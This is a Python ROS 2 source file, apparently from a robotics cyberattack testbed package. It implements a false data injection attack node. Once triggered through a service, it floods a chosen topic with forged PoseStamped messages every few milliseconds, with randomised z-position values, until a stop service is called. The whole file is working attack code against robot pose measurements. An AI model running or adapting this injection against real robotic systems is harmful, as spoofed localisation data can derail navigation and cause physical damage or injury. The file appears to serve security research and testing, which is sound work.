import rclpy, sys
from rclpy.node import Node, NodeNameNonExistentError
from roboticpark_cyberattacks.utils import rslg, printargs
from rcl_interfaces.srv import *
from std_srvs.srv import Trigger
from geometry_msgs.msg import PoseStamped
import random, time
import threading

class fdianode(Node):

    topic=""
    rangeStart=0.0
    rangeEnd=0.0
    publisher = None
    frameid = None
    continueAttack = False
    posx=0.0
    posy=0.0
    posz=0.0
    orx=0.0
    ory=0.0
    orz=0.0
    orw=0.0
    

    def __init__(self):
        super().__init__("fdianode")
        self.declare_parameter('fdia_topic', "Unset")
        self.declare_parameter('fdia_frame_id', "Unset")
        self.declare_parameter('fdia_range_start',0.0)
        self.declare_parameter('fdia_range_end', 0.0)
        self.declare_parameter('fdia_posx', 0.0)
        self.declare_parameter('fdia_posy', 0.0)
        self.declare_parameter('fdia_posz', 0.0)
        self.declare_parameter('fdia_orx', 0.0)
        self.declare_parameter('fdia_ory', 0.0)
        self.declare_parameter('fdia_orz', 0.0)
        self.declare_parameter('fdia_orw', 0.0)
      
        self.topic= self.get_parameter('fdia_topic').get_parameter_value().string_value
        self.frameid= self.get_parameter('fdia_frame_id').get_parameter_value().string_value
        self.rangeStart= self.get_parameter('fdia_range_start').get_parameter_value().double_value
        self.rangeEnd= self.get_parameter('fdia_range_end').get_parameter_value().double_value
        self.posx= self.get_parameter('fdia_posx').get_parameter_value().double_value
        self.posy= self.get_parameter('fdia_posy').get_parameter_value().double_value
        self.posz= self.get_parameter('fdia_posz').get_parameter_value().double_value
        self.orx= self.get_parameter('fdia_orx').get_parameter_value().double_value
        self.ory= self.get_parameter('fdia_ory').get_parameter_value().double_value
        self.orz= self.get_parameter('fdia_orz').get_parameter_value().double_value
        self.orw= self.get_parameter('fdia_orw').get_parameter_value().double_value

        printargs(self)

        rslg(self,f'{self.rangeStart} {self.rangeEnd}')
 
        if self.topic == 'Unset' or self.rangeStart == 0 or self.rangeEnd == 0 or self.frameid == "Unset":
            rslg(self,f'No topic has been specified or invalid range')
            sys.exit()
            
        # Create random injection services, triggers
        serviceName = f'{self.get_name()}/startfdiainject'
        self.srv = self.create_service(Trigger, serviceName, self.fdiainjectbridge)

        serviceName = f'{self.get_name()}/stopfdiainject'
        self.srv = self.create_service(Trigger, serviceName, self.stopfdiainject)

        

    def fdiainjectbridge(self, request, response):
        """This function  acts as a brige to launch the new process via threading

        Parameters:
            request: Dict, the request
            response:  Dict, the response

        """
        response.message = f"Successfully launching random attack"

        threading.Thread(target=self.fdiainject).start()

        response.success = True
        response.message = response.message
        return response



    def fdiainject(self):
        """
        Injects messages into a topic chosen by the user.
        
        This function  injects messagges into one topic, decided by the user who invokes the node
        However, this function is no portable. It will send always the same type of message: geometry_msgs/PoseStamped Message

        DataExample:
            The following is an example of the message data sent by this function:

            .. code-block:: yaml
                
                header:
                    stamp:
                        sec: 1731787676
                        nanosec: 314306003
                    frame_id: map
                pose:
                    position:
                        x: 0.815548477931251
                        y: -0.7515952102717546
                        z: 0.6082673520391061
                    orientation:
                        x: -0.0006039200934903616
                        y: 0.0009935296803737891
                        z: 0.0011008786532515124
                        w: 0.9999987181219213

        Returns:
            None

        """
        rslg(self,f'Launching random false data into pose measures')

        self.continueAttack = True
        self.publisher = self.create_publisher(PoseStamped,self.topic,10)

        while self.continueAttack:
            time.sleep(0.003)
            pose_msg = PoseStamped() 

            pose_msg.header.stamp = self.get_clock().now().to_msg()  
            pose_msg.header.frame_id = self.frameid

            pose_msg.pose.position.x = self.posx
            pose_msg.pose.position.y = self.posy
            pose_msg.pose.position.z = self.posz+random.uniform(self.rangeStart, self.rangeEnd)

            pose_msg.pose.orientation.x = self.orx
            pose_msg.pose.orientation.y = self.ory
            pose_msg.pose.orientation.z = self.orz
            pose_msg.pose.orientation.w = self.orw


            rslg(self,f'{pose_msg}')

            self.publisher.publish(pose_msg)


    def stopfdiainject(self, request,response):
        """This function  marks the stop to the attack with a boolean value establishment

        Parameters:
            request: Dict, the request
            response:  Dict, the response

        """
        response.message = f"Stopped"
        rslg(self,f'Stopping the fdia attack  ')

        self.continueAttack = False

        response.success = True
        response.message = response.message
        return response




def main():
    rclpy.init()
    myfdianode = fdianode()

    rclpy.spin(myfdianode)

    rclpy.shutdown()
    